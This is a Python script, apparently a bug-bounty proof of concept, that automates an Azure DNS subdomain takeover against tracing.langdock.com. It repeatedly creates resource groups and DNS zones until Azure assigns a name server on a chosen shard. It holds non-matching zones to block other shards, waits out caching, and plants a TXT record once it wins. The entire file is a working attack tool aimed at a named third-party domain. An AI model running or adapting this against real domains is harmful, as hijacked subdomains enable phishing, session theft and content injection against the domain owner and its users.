import time
from azure.identity import ClientSecretCredential
from azure.mgmt.dns import DnsManagementClient
from azure.mgmt.resource import ResourceManagementClient

# =============================================================================
# CONFIGURATION
# =============================================================================
TENANT_ID = ""
CLIENT_ID = ""
CLIENT_SECRET = ""
SUBSCRIPTION_ID = ""

TARGET_DOMAIN = "tracing.langdock.com"
TARGET_SHARD = "04"
NUM_GROUPS = 20
RG_PREFIX = "stoscanner-takeovers"
POC_TXT_VALUE = "Bugbounty - DNS takeover POC by Rizin"

# Intervals
CYCLE_WAIT_TIME = 900
# =============================================================================

auth = ClientSecretCredential(TENANT_ID, CLIENT_ID, CLIENT_SECRET)
dns_client = DnsManagementClient(auth, SUBSCRIPTION_ID)
res_client = ResourceManagementClient(auth, SUBSCRIPTION_ID)


def check_match(ns_list):
    return any(f"-{TARGET_SHARD}." in ns.lower() for ns in ns_list)


def run_lottery():
    cycle = 0
    while True:
        cycle += 1
        print(f"\n=== Starting Cycle #{cycle} at {time.strftime('%H:%M:%S')} ===")
        active_rgs = []
        winner_found = False

        # PHASE 1: FILL (Occupying Shards)
        for i in range(1, NUM_GROUPS + 1):
            rg_name = f"{RG_PREFIX}_{i}"
            try:
                print(f"[*] Creating {rg_name} and Zone...")
                res_client.resource_groups.create_or_update(rg_name, {"location": "eastus"})
                active_rgs.append(rg_name)

                zone = dns_client.zones.create_or_update(rg_name, TARGET_DOMAIN, {"location": "global"})
                ns_list = zone.name_servers
                print(f"    Assigned NS: {ns_list}")

                if check_match(ns_list):
                    print(f"\n[!!!] MATCH FOUND ON SHARD {TARGET_SHARD} in {rg_name}!")
                    # Add POC Record to the winner
                    dns_client.record_sets.create_or_update(rg_name, TARGET_DOMAIN, "@", "TXT",
                                                            {"ttl": 300, "txt_records": [{"value": [POC_TXT_VALUE]}]})
                    winner_found = True
                    break  # Stop creating once we win

                print(f"    [-] No match. Keeping alive to block shard.")

            except Exception as e:
                print(f"    [!] Error: {e}")

        # PHASE 2: FLUSH (Cleanup losers)
        if winner_found:
            print("[*] Victory! Cleaning up only the losing groups...")
            winning_rg = active_rgs[-1]
            for rg in active_rgs:
                if rg != winning_rg:
                    res_client.resource_groups.begin_delete(rg)
            print(f"[FINAL] Success. POC live in {winning_rg}. Script exiting.")
            return

        # PHASE 3: COOL DOWN
        print(f"\n[*] All {NUM_GROUPS} zones active and shards occupied.")
        print(f"[*] Sleeping {CYCLE_WAIT_TIME / 60} minutes to bypass sticky cache...")
        time.sleep(CYCLE_WAIT_TIME)

        print("[*] Flushing all zones to reset for next cycle...")
        for rg in active_rgs:
            try:
                res_client.resource_groups.begin_delete(rg)
            except:
                pass

        # Wait a bit for the deletes to actually process in the backend
        time.sleep(60)


if __name__ == "__main__":
    run_lottery()